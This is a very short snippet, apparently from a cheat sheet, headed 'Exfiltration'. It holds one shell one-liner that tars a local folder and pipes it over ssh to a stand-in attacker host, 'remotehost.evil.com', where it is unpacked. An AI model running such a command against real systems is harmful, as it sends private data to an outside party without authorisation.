# Exfiltration
tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"

